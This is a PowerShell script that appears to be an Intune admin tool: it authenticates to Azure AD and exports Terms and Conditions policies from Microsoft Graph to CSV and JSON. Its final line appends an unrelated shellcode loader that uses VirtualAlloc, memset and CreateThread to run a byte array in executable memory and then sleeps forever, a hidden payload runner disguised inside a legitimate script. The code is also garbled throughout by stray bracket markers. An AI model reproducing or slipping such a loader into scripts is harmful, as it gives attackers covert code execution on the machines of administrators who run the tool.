


 -||-> function Get-AuthToken {



[cmdletbinding()]

param
(
    [Parameter(Mandatory=$true)]
    $User
)

 -||-> $userUpn =  -||-> New-Object "System.Net.Mail.MailAddress" -ArgumentList $User <-||-  <-||- 

 -||-> $tenant = $userUpn.Host <-||- 

 -||-> Write-Host "Checking for AzureAD module..." <-||- 

     -||-> $AadModule =  -||-> Get-Module -Name "AzureAD" -ListAvailable <-||-  <-||- 

     -||-> if ( -||-> $AadModule -eq $null <-||- ) {

         -||-> Write-Host "AzureAD PowerShell module not found, looking for AzureADPreview" <-||- 
         -||-> $AadModule =  -||-> Get-Module -Name "AzureADPreview" -ListAvailable <-||-  <-||- 

    } <-||- 

     -||-> if ( -||-> $AadModule -eq $null <-||- ) {
         -||-> write-host <-||- 
         -||-> write-host "AzureAD Powershell module not installed..." -f Red <-||- 
         -||-> write-host "Install by running 'Install-Module AzureAD' or 'Install-Module AzureADPreview' from an elevated PowerShell prompt" -f Yellow <-||- 
         -||-> write-host "Script can't continue..." -f Red <-||- 
         -||-> write-host <-||- 
        exit
    } <-||- 




     -||-> if( -||-> $AadModule.count -gt 1 <-||- ){

         -||-> $Latest_Version = ( -||-> $AadModule | select version | Sort-Object <-||- )[-1] <-||- 

         -||-> $aadModule =  -||-> $AadModule | ? {  -||-> $_.version -eq $Latest_Version.version <-||-  } <-||-  <-||- 

            

             -||-> if( -||-> $AadModule.count -gt 1 <-||- ){

             -||-> $aadModule =  -||-> $AadModule | select -Unique <-||-  <-||- 

            } <-||- 

         -||-> $adal =  -||-> Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.dll" <-||-  <-||- 
         -||-> $adalforms =  -||-> Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll" <-||-  <-||- 

    }

    else {

         -||-> $adal =  -||-> Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.dll" <-||-  <-||- 
         -||-> $adalforms =  -||-> Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll" <-||-  <-||- 

    } <-||- 

 -||-> [System.Reflection.Assembly]::LoadFrom($adal) | Out-Null <-||- 

 -||-> [System.Reflection.Assembly]::LoadFrom($adalforms) | Out-Null <-||- 

 -||-> $clientId = "d1ddf0e4-d672-4dae-b554-9d5bdfd93547" <-||- 

 -||-> $redirectUri = "urn:ietf:wg:oauth:2.0:oob" <-||- 

 -||-> $resourceAppIdURI = "https://graph.microsoft.com" <-||- 

 -||-> $authority = "https://login.microsoftonline.com/$Tenant" <-||- 

     -||-> try {

     -||-> $authContext =  -||-> New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.AuthenticationContext" -ArgumentList $authority <-||-  <-||- 

    
    

     -||-> $platformParameters =  -||-> New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.PlatformParameters" -ArgumentList "Auto" <-||-  <-||- 

     -||-> $userId =  -||-> New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.UserIdentifier" -ArgumentList ( -||-> $User, "OptionalDisplayableId" <-||- ) <-||-  <-||- 

     -||-> $authResult = $authContext.AcquireTokenAsync($resourceAppIdURI,$clientId,$redirectUri,$platformParameters,$userId).Result <-||- 

        

         -||-> if( -||-> $authResult.AccessToken <-||- ){

        

         -||-> $authHeader = @{
            'Content-Type'= -||-> 'application/json' <-||- 
            'Authorization'= -||-> "Bearer " + $authResult.AccessToken <-||- 
            'ExpiresOn'= -||-> $authResult.ExpiresOn <-||- 
            } <-||- 

        return  -||-> $authHeader <-||- 

        }

        else {

         -||-> Write-Host <-||- 
         -||-> Write-Host "Authorization Access Token is null, please re-run authentication..." -ForegroundColor Red <-||- 
         -||-> Write-Host <-||- 
        break

        } <-||- 

    }

    catch {

     -||-> write-host $_.Exception.Message -f Red <-||- 
     -||-> write-host $_.Exception.ItemName -f Red <-||- 
     -||-> write-host <-||- 
    break

    } <-||- 

} <-||- 



 -||-> Function Get-TermsAndConditions(){



[cmdletbinding()]

param
(
    $Name
)

 -||-> $graphApiVersion = "Beta" <-||- 
 -||-> $resource = "deviceManagement/termsAndConditions" <-||- 

     -||-> try {

         -||-> if( -||-> $Name <-||- ){

         -||-> $uri = "https://graph.microsoft.com/$graphApiVersion/$( -||-> $resource <-||- )" <-||- 
         -||-> ( -||-> Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get <-||- ).Value | Where-Object {  -||-> ( -||-> $_.'displayName' <-||- ).contains("$Name") <-||-  } <-||- 

        }

        else {

         -||-> $uri = "https://graph.microsoft.com/$graphApiVersion/$( -||-> $resource <-||- )" <-||- 
         -||-> ( -||-> Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get <-||- ).Value <-||- 

        } <-||- 

    }

    catch {

     -||-> $ex = $_.Exception <-||- 
     -||-> $errorResponse = $ex.Response.GetResponseStream() <-||- 
     -||-> $reader =  -||-> New-Object System.IO.StreamReader( -||-> $errorResponse <-||- ) <-||-  <-||- 
     -||-> $reader.BaseStream.Position = 0 <-||- 
     -||-> $reader.DiscardBufferedData() <-||- 
     -||-> $responseBody = $reader.ReadToEnd() <-||- ;
     -||-> Write-Host "Response content:`n$responseBody" -f Red <-||- 
     -||-> Write-Error "Request to $Uri failed with HTTP Status $( -||-> $ex.Response.StatusCode <-||- ) $( -||-> $ex.Response.StatusDescription <-||- )" <-||- 
     -||-> write-host <-||- 
    break

    } <-||- 

} <-||- 



 -||-> Function Export-JSONData(){
	

        
param (
    
    $JSON,
    $ExportPath
    
)
        
     -||-> try
    {
        
         -||-> if ( -||-> $JSON -eq "" -or $JSON -eq $null <-||- )
        {
            
             -||-> write-host "No JSON specified, please specify valid JSON..." -f Red <-||- 
            
        }
        
        elseif ( -||-> !$ExportPath <-||- )
        {
            
             -||-> write-host "No export path parameter set, please provide a path to export the file" -f Red <-||- 
            
        }
        
        elseif ( -||-> !( -||-> Test-Path $ExportPath <-||- ) <-||- )
        {
            
             -||-> write-host "$ExportPath doesn't exist, can't export JSON Data" -f Red <-||- 
            
        }
        
        else
        {
            
             -||-> $JSON1 =  -||-> ConvertTo-Json $JSON <-||-  <-||- 
            
             -||-> $JSON_Convert =  -||-> $JSON1 | ConvertFrom-Json <-||-  <-||- 
            
             -||-> $displayName = $JSON_Convert.displayName <-||- 

            
             -||-> $DisplayName = $DisplayName -replace '\<|\>|:|"|/|\\|\||\?|\*', "_" <-||- 
            
             -||-> $Properties = ( -||-> $JSON_Convert | Get-Member | ? {  -||-> $_.MemberType -eq "NoteProperty" <-||-  } <-||- ).Name <-||- 
            
             -||-> $FileName_CSV = "$DisplayName" + "_" + $( -||-> get-date -f dd-MM-yyyy-H-mm-ss <-||- ) + ".csv" <-||- 
             -||-> $FileName_JSON = "$DisplayName" + "_" + $( -||-> get-date -f dd-MM-yyyy-H-mm-ss <-||- ) + ".json" <-||- 
            
             -||-> $Object =  -||-> New-Object System.Object <-||-  <-||- 
            
             -||-> foreach ($Property in  -||-> $Properties <-||- )
            {
                
                 -||-> $Object | Add-Member -MemberType NoteProperty -Name $Property -Value $JSON_Convert.$Property <-||- 
                
            } <-||- 
            
             -||-> write-host "Export Path:" "$ExportPath" <-||- 
            
             -||-> $Object | Export-Csv -LiteralPath "$ExportPath\$FileName_CSV" -Delimiter "," -NoTypeInformation -Append <-||- 
             -||-> $JSON1 | Set-Content -LiteralPath "$ExportPath\$FileName_JSON" <-||- 
             -||-> write-host "CSV created in $ExportPath\$FileName_CSV..." -f cyan <-||- 
             -||-> write-host "JSON created in $ExportPath\$FileName_JSON..." -f cyan <-||- 
            
        } <-||- 
        
    }
    
    catch
    {
        
         -||-> $_.Exception <-||- 
        
    } <-||- 
    
} <-||- 
    




 -||-> write-host <-||- 


 -||-> if( -||-> $global:authToken <-||- ){

    
     -||-> $DateTime = ( -||-> Get-Date <-||- ).ToUniversalTime() <-||- 

    
     -||-> $TokenExpires = ( -||-> $authToken.ExpiresOn.datetime - $DateTime <-||- ).Minutes <-||- 

         -||-> if( -||-> $TokenExpires -le 0 <-||- ){

         -||-> write-host "Authentication Token expired" $TokenExpires "minutes ago" -ForegroundColor Yellow <-||- 
         -||-> write-host <-||- 

            

             -||-> if( -||-> $User -eq $null -or $User -eq "" <-||- ){

             -||-> $User =  -||-> Read-Host -Prompt "Please specify your user principal name for Azure Authentication" <-||-  <-||- 
             -||-> Write-Host <-||- 

            } <-||- 

         -||-> $global:authToken =  -||-> Get-AuthToken -User $User <-||-  <-||- 

        } <-||- 
}



else {

     -||-> if( -||-> $User -eq $null -or $User -eq "" <-||- ){

     -||-> $User =  -||-> Read-Host -Prompt "Please specify your user principal name for Azure Authentication" <-||-  <-||- 
     -||-> Write-Host <-||- 

    } <-||- 


 -||-> $global:authToken =  -||-> Get-AuthToken -User $User <-||-  <-||- 

} <-||- 





 -||-> $ExportPath =  -||-> Read-Host -Prompt "Please specify a path to export the policy data to e.g. C:\IntuneOutput" <-||-  <-||- 



 -||-> if ( -||-> !( -||-> Test-Path "$ExportPath" <-||- ) <-||- )
{
	
	 -||-> Write-Host <-||- 
	 -||-> Write-Host "Path '$ExportPath' doesn't exist, do you want to create this directory? Y or N?" -ForegroundColor Yellow <-||- 
	
	 -||-> $Confirm =  -||-> read-host <-||-  <-||- 
	
	 -||-> if ( -||-> $Confirm -eq "y" -or $Confirm -eq "Y" <-||- )
	{
		
		 -||-> new-item -ItemType Directory -Path "$ExportPath" | Out-Null <-||- 
		 -||-> Write-Host <-||- 
		
	}
	
	else
	{
		
		 -||-> Write-Host "Creation of directory path was cancelled..." -ForegroundColor Red <-||- 
		 -||-> Write-Host <-||- 
		break
		
	} <-||- 
	
} <-||- 

 -||-> Write-Host <-||- 



 -||-> $TCs =  -||-> Get-TermsAndConditions <-||-  <-||- 

 -||-> foreach ($TC in  -||-> $TCs <-||- )
{
	
	 -||-> write-host "Terms and Conditions Policy:"$TSc.displayName -f Yellow <-||- 
	 -||-> Export-JSONData -JSON $TC -ExportPath "$ExportPath" <-||- 
	 -||-> Write-Host <-||- 
	
} <-||- 

 -||-> $c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = <-||-  ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $x=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $x.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$x,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



